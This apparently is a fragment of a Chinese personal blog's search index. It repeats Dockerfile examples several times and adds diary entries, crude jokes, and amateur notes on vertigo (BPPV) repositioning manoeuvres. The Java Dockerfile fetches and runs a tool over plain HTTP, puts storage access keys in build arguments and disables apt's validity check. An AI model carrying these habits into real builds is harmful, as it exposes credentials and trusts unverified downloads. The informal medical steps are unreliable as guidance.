bin/$FILENAME . CMD ./$FILENAME ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:5","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-java-示例-1"},{"categories":["blog"],"content":" CICD 外部构建版本/仅容器/无构建 Dockerfile-java 示例 FROM openjdk:8 AS base COPY --from=apache/skywalking-java-agent:8.9.0-alpine /skywalking/agent /agent/ COPY --from=hengyunabc/arthas:latest /opt/arthas /arthas # 参数 ARG oss_end_point ARG oss_ak ARG oss_sk # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less xfonts-utils iproute2 iputils-ping psmisc -y # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 设置宋体 RUN mkdir -p /usr/share/fonts/simsun \\ \u0026\u0026 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://oss仓库/fonts/ /usr/share/fonts/simsun/ -e $oss_end_point -i $oss_ak -k $oss_sk \\ \u0026\u0026 mkfontscale \\ \u0026\u0026 mkfontdir \\ \u0026\u0026 fc-list :lang=zh FROM base AS final WORKDIR /workload ARG jar_path ENV jar_path=$jar_path ARG jar_name ENV jar_name=$jar_name # 外部设置特殊的启动参数 ARG deploy_params ENV deploy_params=$deploy_params COPY $jar_path /workload/$jar_name RUN echo $deploy_params \u0026\u0026 echo $jar_name CMD exec java $deploy_params -jar $jar_name Dockerfile-node 示例 FROM node:16 AS base WORKDIR /workload # 安装所需的程序 RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less -y # 进行时区基本信息的设置 ENV TZ=\"Asia/Shanghai\" # 开始构建 COPY .nuxt /workload/.nuxt COPY static /workload/static COPY package.json /workload/package.json COPY node_modules /workload/node_modules COPY nuxt.config.js /workload/nuxt.config.js CMD npm run start Dockerfile 静态页示例配合 nginx容器配置 使用 FROM nginx:1.21.1 AS base # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less iproute2 iputils-ping -y # 进行时区等基本信息的设置 ENV TZ=Asia/Shanghai FROM base AS final WORKDIR /workload COPY nginx.conf /etc/nginx/conf.d/default.conf COPY dist /usr/share/nginx/html alpine 版本 FROM nginx:alpine # 使用alpine基础配置 COPY dist/build/h5 /usr/share/nginx/html COPY nginx.conf /etc/nginx/conf.d/default.conf Dockerfile-golang 示例 FROM golang:1.21 # 使用debian基础配置 ARG filename ENV FILENAME=$filename WORKDIR /app COPY bin/$FILENAME . CMD ./$FILENAME ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:5","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-node-示例"},{"categories":["blog"],"content":" CICD 外部构建版本/仅容器/无构建 Dockerfile-java 示例 FROM openjdk:8 AS base COPY --from=apache/skywalking-java-agent:8.9.0-alpine /skywalking/agent /agent/ COPY --from=hengyunabc/arthas:latest /opt/arthas /arthas # 参数 ARG oss_end_point ARG oss_ak ARG oss_sk # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less xfonts-utils iproute2 iputils-ping psmisc -y # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 设置宋体 RUN mkdir -p /usr/share/fonts/simsun \\ \u0026\u0026 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://oss仓库/fonts/ /usr/share/fonts/simsun/ -e $oss_end_point -i $oss_ak -k $oss_sk \\ \u0026\u0026 mkfontscale \\ \u0026\u0026 mkfontdir \\ \u0026\u0026 fc-list :lang=zh FROM base AS final WORKDIR /workload ARG jar_path ENV jar_path=$jar_path ARG jar_name ENV jar_name=$jar_name # 外部设置特殊的启动参数 ARG deploy_params ENV deploy_params=$deploy_params COPY $jar_path /workload/$jar_name RUN echo $deploy_params \u0026\u0026 echo $jar_name CMD exec java $deploy_params -jar $jar_name Dockerfile-node 示例 FROM node:16 AS base WORKDIR /workload # 安装所需的程序 RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less -y # 进行时区基本信息的设置 ENV TZ=\"Asia/Shanghai\" # 开始构建 COPY .nuxt /workload/.nuxt COPY static /workload/static COPY package.json /workload/package.json COPY node_modules /workload/node_modules COPY nuxt.config.js /workload/nuxt.config.js CMD npm run start Dockerfile 静态页示例配合 nginx容器配置 使用 FROM nginx:1.21.1 AS base # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less iproute2 iputils-ping -y # 进行时区等基本信息的设置 ENV TZ=Asia/Shanghai FROM base AS final WORKDIR /workload COPY nginx.conf /etc/nginx/conf.d/default.conf COPY dist /usr/share/nginx/html alpine 版本 FROM nginx:alpine # 使用alpine基础配置 COPY dist/build/h5 /usr/share/nginx/html COPY nginx.conf /etc/nginx/conf.d/default.conf Dockerfile-golang 示例 FROM golang:1.21 # 使用debian基础配置 ARG filename ENV FILENAME=$filename WORKDIR /app COPY bin/$FILENAME . CMD ./$FILENAME ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:5","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-静态页示例-1"},{"categories":["blog"],"content":" CICD 外部构建版本/仅容器/无构建 Dockerfile-java 示例 FROM openjdk:8 AS base COPY --from=apache/skywalking-java-agent:8.9.0-alpine /skywalking/agent /agent/ COPY --from=hengyunabc/arthas:latest /opt/arthas /arthas # 参数 ARG oss_end_point ARG oss_ak ARG oss_sk # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less xfonts-utils iproute2 iputils-ping psmisc -y # 进行时区基本信息的设置 ENV TZ=Asia/Shanghai # 设置宋体 RUN mkdir -p /usr/share/fonts/simsun \\ \u0026\u0026 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 \\ \u0026\u0026 chmod 755 ossutil64 \\ \u0026\u0026 ./ossutil64 cp -r oss://oss仓库/fonts/ /usr/share/fonts/simsun/ -e $oss_end_point -i $oss_ak -k $oss_sk \\ \u0026\u0026 mkfontscale \\ \u0026\u0026 mkfontdir \\ \u0026\u0026 fc-list :lang=zh FROM base AS final WORKDIR /workload ARG jar_path ENV jar_path=$jar_path ARG jar_name ENV jar_name=$jar_name # 外部设置特殊的启动参数 ARG deploy_params ENV deploy_params=$deploy_params COPY $jar_path /workload/$jar_name RUN echo $deploy_params \u0026\u0026 echo $jar_name CMD exec java $deploy_params -jar $jar_name Dockerfile-node 示例 FROM node:16 AS base WORKDIR /workload # 安装所需的程序 RUN sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less -y # 进行时区基本信息的设置 ENV TZ=\"Asia/Shanghai\" # 开始构建 COPY .nuxt /workload/.nuxt COPY static /workload/static COPY package.json /workload/package.json COPY node_modules /workload/node_modules COPY nuxt.config.js /workload/nuxt.config.js CMD npm run start Dockerfile 静态页示例配合 nginx容器配置 使用 FROM nginx:1.21.1 AS base # 安装所需的程序 RUN mkdir -p /data/weblog \\ \u0026\u0026 sed -i \"s@http://ftp.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://security.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 sed -i \"s@http://deb.debian.org@https://repo.huaweicloud.com@g\" /etc/apt/sources.list \\ \u0026\u0026 apt-get -o Acquire::Check-Valid-Until=false update -y \\ \u0026\u0026 apt-get install apt-transport-https ca-certificates -y \\ \u0026\u0026 apt-get install vim telnet less iproute2 iputils-ping -y # 进行时区等基本信息的设置 ENV TZ=Asia/Shanghai FROM base AS final WORKDIR /workload COPY nginx.conf /etc/nginx/conf.d/default.conf COPY dist /usr/share/nginx/html alpine 版本 FROM nginx:alpine # 使用alpine基础配置 COPY dist/build/h5 /usr/share/nginx/html COPY nginx.conf /etc/nginx/conf.d/default.conf Dockerfile-golang 示例 FROM golang:1.21 # 使用debian基础配置 ARG filename ENV FILENAME=$filename WORKDIR /app COPY bin/$FILENAME . CMD ./$FILENAME ","date":"2023-09-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/:4:5","series":null,"tags":["blog","docker"],"title":"Dockerfile教程","uri":"/posts/%E7%AC%94%E8%AE%B0/dockerfile%E6%95%99%E7%A8%8B/#dockerfile-golang-示例"},{"categories":["journal"],"content":"2023-09-04 日记","date":"2023-09-04","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-04/","series":null,"tags":["journal"],"title":"2023-09-04","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-04/"},{"categories":["journal"],"content":"#fun 有趣的个人介绍: 反正人生很无聊，认识认识好不好，美丽可爱有活力——贞好 产品名称：于贞 ingrita 产品类型：女 Rapper 产品尺寸：160cm 47kg 配料：美貌 才华 幽默 知识 哲学 营养成分：歌声 舞蹈 说唱 DJ 生产日期：1996.11.8 保质期：看情况 生产商：我妈 产地：四川南充 地址：上海市黄浦区 使用说明：定时投放巧克力、肉、海贼王、喜剧电影、动感的音乐；喜 欢白色 蓝色、偶尔买点小礼物，不挑 使用禁忌：恐高 怕狗 不喜欢麻烦 不吃葱香菜等异味蔬菜 不良反应：使用期间可能过于开心、停止使用会产生无聊情绪 #fun/影片 朝鲜人对在日朝侨是羡慕妒忌恨。很多人被关到了特殊集中营，在政治上很难出头，是集中管理的特殊阶层。70年代坐万景峰号归国的朝鲜人有30万人，来了以后就不能回去，慢慢同化于朝鲜底层。 日侨只有一些极特殊的例子得以幸免，比如金正恩的生母高容姬，在万寿台艺术团跳舞，被金二看中，抛弃了長子金正男的母亲成蕙琳，成蕙琳原来是韩国南部的著名电影演员。战争期间举家北上，原来已经嫁给了朝鲜著名作家的儿子，被金二强行霸占，因为不被金大大认可，至死没得到名分，被抛弃后送到苏联治病，积郁成疾，80年代病逝。 她和金正日的长子金正男因为在2001年曾持假护照携妻子儿女游玩日本东京迪士尼乐园，并多次赞美中国的改革开放，声言朝鲜只有学习中国建立社会主义市场经济体制才有出路，因而不仅丧失了继承朝鲜最高领袖的可能性，而且不得不移居澳门、上海、北京等地，十数年间未回朝鲜，2017年2月13日金正日的長子金正男在馬來西亞遭刺殺身亡，朝鲜特工小组指示两名越南和印尼的女孩以剧毒物在机场暗杀了金正男。 成蕙琳的几个闺蜜在其入宫后因怕泄露隐私，被关到了集中营。 对旅日朝侨的故事感兴趣的可以看在日朝鲜人第二代拍的你好平壤，再见平壤系列片。这是经典。 书籍有平壤水族館Aquariums of Pyongyang，是归国日侨姜哲煥写的传记,被洛杉矶时报评为2002年最佳书 失控玩家 Twitch 荒野会谈 ","date":"2023-09-04","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-04/:0:0","series":null,"tags":["journal"],"title":"2023-09-04","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-04/#"},{"categories":["point"],"content":" 什么是耳石症为什么人转圈后, 会东倒西歪站不稳? 每个人的耳朵里都有很多的小碎石. 在你旋转的时候, 这些耳石会漂浮, 移动. 就是导致你东倒西歪, 天旋地转的原因. 耳石症就是耳石移动到了半规管里. 导致人感觉到眩晕, 不平衡. ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:1","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#什么是耳石症"},{"categories":["point"],"content":" 耳石症分类 前/后 posterior 半规管耳石症 - 几率较高 前半规和后半规检查方法一致，所以要根据研究跳动来判断 检测方法叫 Dix-Hallpike： 向患侧转直接 45 度，快速躺下。因为很可能不放松，所以可以侧卧然后向上转头 45 度 治疗方法: Epley 和 Semon Horizontal 水平半规管检测方法: 仰卧, 将受检者头部向一侧快速旋转 90°，当头转向一侧时出现水平眼震. 治疗方法: BBQ/Lempert 前半规管耳石症视频参考: 深部头部悬挂机动治疗BPPV眩晕 - YouTube ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:2","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#耳石症分类"},{"categories":["point"],"content":" 耳石症分类 前/后 posterior 半规管耳石症 - 几率较高 前半规和后半规检查方法一致，所以要根据研究跳动来判断 检测方法叫 Dix-Hallpike： 向患侧转直接 45 度，快速躺下。因为很可能不放松，所以可以侧卧然后向上转头 45 度 治疗方法: Epley 和 Semon Horizontal 水平半规管检测方法: 仰卧, 将受检者头部向一侧快速旋转 90°，当头转向一侧时出现水平眼震. 治疗方法: BBQ/Lempert 前半规管耳石症视频参考: 深部头部悬挂机动治疗BPPV眩晕 - YouTube ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:2","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#前后-posterior-半规管耳石症---几率较高"},{"categories":["point"],"content":" 耳石症分类 前/后 posterior 半规管耳石症 - 几率较高 前半规和后半规检查方法一致，所以要根据研究跳动来判断 检测方法叫 Dix-Hallpike： 向患侧转直接 45 度，快速躺下。因为很可能不放松，所以可以侧卧然后向上转头 45 度 治疗方法: Epley 和 Semon Horizontal 水平半规管检测方法: 仰卧, 将受检者头部向一侧快速旋转 90°，当头转向一侧时出现水平眼震. 治疗方法: BBQ/Lempert 前半规管耳石症视频参考: 深部头部悬挂机动治疗BPPV眩晕 - YouTube ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:2","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#horizontal-水平半规管"},{"categories":["point"],"content":" 耳石症分类 前/后 posterior 半规管耳石症 - 几率较高 前半规和后半规检查方法一致，所以要根据研究跳动来判断 检测方法叫 Dix-Hallpike： 向患侧转直接 45 度，快速躺下。因为很可能不放松，所以可以侧卧然后向上转头 45 度 治疗方法: Epley 和 Semon Horizontal 水平半规管检测方法: 仰卧, 将受检者头部向一侧快速旋转 90°，当头转向一侧时出现水平眼震. 治疗方法: BBQ/Lempert 前半规管耳石症视频参考: 深部头部悬挂机动治疗BPPV眩晕 - YouTube ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:2","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#前半规管耳石症"},{"categories":["point"],"content":" 治疗方法 EpleyEpley 治疗方法：转右 45 度，躺下。转 90 到左边。继续左转侧卧，头部还是处于身体的左 45 度。坐起朝左，头可以慢慢回正. 视频参考: Epley机动来治疗BPPV眩晕 - YouTube SemonSemon 复位: 向健侧转 45 度, 朝着患侧倒下, 患侧倒向另外一侧. 视频参考: Semont Maneuver for Left Ear - 2014 - YouTube BBQ/LempertBBQ 质量: 仰卧, 向患侧 90 度. 然后向健侧回正 90 度, 一直旋转. 视频参考: Lempert（BBQ）机动来治疗BPPV眩晕 - YouTube GufoniGufoni 治疗: 直坐, 患侧倒下. 头向上 45 度. 回正 图文参考: Lateral Canal BPPV – Gufoni for ageo (dizziness-and-balance.com) ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:3","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#治疗方法"},{"categories":["point"],"content":" 治疗方法 EpleyEpley 治疗方法：转右 45 度，躺下。转 90 到左边。继续左转侧卧，头部还是处于身体的左 45 度。坐起朝左，头可以慢慢回正. 视频参考: Epley机动来治疗BPPV眩晕 - YouTube SemonSemon 复位: 向健侧转 45 度, 朝着患侧倒下, 患侧倒向另外一侧. 视频参考: Semont Maneuver for Left Ear - 2014 - YouTube BBQ/LempertBBQ 质量: 仰卧, 向患侧 90 度. 然后向健侧回正 90 度, 一直旋转. 视频参考: Lempert（BBQ）机动来治疗BPPV眩晕 - YouTube GufoniGufoni 治疗: 直坐, 患侧倒下. 头向上 45 度. 回正 图文参考: Lateral Canal BPPV – Gufoni for ageo (dizziness-and-balance.com) ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:3","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#epley"},{"categories":["point"],"content":" 治疗方法 EpleyEpley 治疗方法：转右 45 度，躺下。转 90 到左边。继续左转侧卧，头部还是处于身体的左 45 度。坐起朝左，头可以慢慢回正. 视频参考: Epley机动来治疗BPPV眩晕 - YouTube SemonSemon 复位: 向健侧转 45 度, 朝着患侧倒下, 患侧倒向另外一侧. 视频参考: Semont Maneuver for Left Ear - 2014 - YouTube BBQ/LempertBBQ 质量: 仰卧, 向患侧 90 度. 然后向健侧回正 90 度, 一直旋转. 视频参考: Lempert（BBQ）机动来治疗BPPV眩晕 - YouTube GufoniGufoni 治疗: 直坐, 患侧倒下. 头向上 45 度. 回正 图文参考: Lateral Canal BPPV – Gufoni for ageo (dizziness-and-balance.com) ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:3","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#semon"},{"categories":["point"],"content":" 治疗方法 EpleyEpley 治疗方法：转右 45 度，躺下。转 90 到左边。继续左转侧卧，头部还是处于身体的左 45 度。坐起朝左，头可以慢慢回正. 视频参考: Epley机动来治疗BPPV眩晕 - YouTube SemonSemon 复位: 向健侧转 45 度, 朝着患侧倒下, 患侧倒向另外一侧. 视频参考: Semont Maneuver for Left Ear - 2014 - YouTube BBQ/LempertBBQ 质量: 仰卧, 向患侧 90 度. 然后向健侧回正 90 度, 一直旋转. 视频参考: Lempert（BBQ）机动来治疗BPPV眩晕 - YouTube GufoniGufoni 治疗: 直坐, 患侧倒下. 头向上 45 度. 回正 图文参考: Lateral Canal BPPV – Gufoni for ageo (dizziness-and-balance.com) ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:3","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#bbqlempert"},{"categories":["point"],"content":" 治疗方法 EpleyEpley 治疗方法：转右 45 度，躺下。转 90 到左边。继续左转侧卧，头部还是处于身体的左 45 度。坐起朝左，头可以慢慢回正. 视频参考: Epley机动来治疗BPPV眩晕 - YouTube SemonSemon 复位: 向健侧转 45 度, 朝着患侧倒下, 患侧倒向另外一侧. 视频参考: Semont Maneuver for Left Ear - 2014 - YouTube BBQ/LempertBBQ 质量: 仰卧, 向患侧 90 度. 然后向健侧回正 90 度, 一直旋转. 视频参考: Lempert（BBQ）机动来治疗BPPV眩晕 - YouTube GufoniGufoni 治疗: 直坐, 患侧倒下. 头向上 45 度. 回正 图文参考: Lateral Canal BPPV – Gufoni for ageo (dizziness-and-balance.com) ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:3","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#gufoni"},{"categories":["point"],"content":" 其他中文总结参考 https://k.sina.cn/article_1057581134_3f09684e00100jt01.html?from=health …… dix 和 roll-test 测试。湘雅三医院 ","date":"2023-09-04","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/:0:4","series":null,"tags":["point","耳石症","生活/医"],"title":"耳石症","uri":"/posts/%E7%AC%94%E8%AE%B0/point/%E8%80%B3%E7%9F%B3%E7%97%87/#其他"},{"categories":["journal"],"content":"2023-09-03 日记","date":"2023-09-03","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-03/","series":null,"tags":["journal"],"title":"2023-09-03","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-03/"},{"categories":["journal"],"content":"#fun 非常好看的诺兰采访视频. 深入了回答了很多拍摄细节, 甚至是秘诀. 内容有关于实拍, IMAX, 非线性叙事, 演员, 音乐, 拖延症, 低成本创作. 甚至让我有了想要实践的冲动 对话诺兰！导演亲自揭开《奥本海默》的6个秘密_哔哩哔哩_bilibili ","date":"2023-09-03","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-03/:0:0","series":null,"tags":["journal"],"title":"2023-09-03","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-03/#"},{"categories":["journal"],"content":"2023-09-02 日记","date":"2023-09-02","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-02/","series":null,"tags":["journal"],"title":"2023-09-02","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-02/"},{"categories":["journal"],"content":"#方法/面对问题 我在整理笔记的时候, 有一些在潭州教育学到的内容. 感性的烦恼. \u003c我是传奇\u003e这部电影只有 1 个人, 1 条狗. 但也会有烦恼. 所以烦恼是来自于内心. 在长沙银行做错事情, 导致数据暂停分发了一天. 觉得天要塌下来了. 其实任何事情都不能保证一帆风顺,时刻需要反思后重新出发 #方法/公司 文化的作用: 统一/明确认知 方向明确 减少矛盾 文化如何起作用: 意义 - 关系 - 情绪 - 习惯 肯定要有意义，告诉他有什么意思 和他有什么关系，让他自己想清楚 勾引起情绪 养成习惯 文化如何检验: 绩效 能力 反馈 #fun/影片 反美阴谋 环形物语 西部世界 开发者 devs 落叶归根 成都大运会，用集体主义审美麻醉，忘掉个人权利的伸张。｜大运会｜成都｜｜世大運｜universiade202｜集体主义｜王局拍案20230801｜ - YouTube 入门旗舰梦想显示器，32寸4k144Hz显示器只要1999？！拓谱申GX321UR体验评测_哔哩哔哩_bilibili 【颠疯日记】颠疯结束了…日记还没写完….那阵子行程比较赶…小王有点慢大家凑合看_哔哩哔哩_bilibili 男爵新作：《一个男人决定卖房时》！_哔哩哔哩_bilibili TED演讲：真正的强大，是敢于面对那个脆弱、不完美的自己_哔哩哔哩_bilibili 中国最慢的绿皮火车！花10元买了票，上车的瞬间傻眼了 斯坦福监狱实验 ","date":"2023-09-02","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-02/:0:0","series":null,"tags":["journal"],"title":"2023-09-02","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-09-02/#"},{"categories":["journal"],"content":"2023-08-31 日记","date":"2023-08-31","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-31/","series":null,"tags":["journal"],"title":"2023-08-31","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-31/"},{"categories":["journal"],"content":"#fun/影片 美剧 - 斯巴达 必看 琅琊榜 隐秘的角落 沉默的真相 38 师机动队魔鬼代言人 希腊三部曲史崔特先生的故事 -1998（包括相关推荐） Between two worlds 夺命金 生化危机 敦刻尔克 #fun 一则笑话和 3 个老二有什么差别？你妈妈开不起玩笑 一个女生为什么像避孕套？因为她花在你钱包的时间比在你老二上的多 哪种体位会生出丑宝宝？问你妈妈 ","date":"2023-08-31","objectID":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-31/:0:0","series":null,"tags":["journal"],"title":"2023-08-31","uri":"/posts/%E6%97%A5%E8%AE%B0/%E5%BD%92%E6%A1%A3/2023-08-31/#"},{"categories":["point"],"content":"alist 是一个支持多存储的网盘/WebDAV 工具. ","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:0:0","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#"},{"categories":["point"],"content":" 运行","date":"2023-08-31","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/alist/:1:0","series":null,"tags":["point","未命名"],"title":"alist","uri":"/posts/%E7%AC%94%E8%AE%B0/point/alist/#运行"},{"categories":["point"],"content":" 服务启动docker-compose 配置文件 docker-compose.yml version: \"3.3\" services: alist: restart: always volumes: - 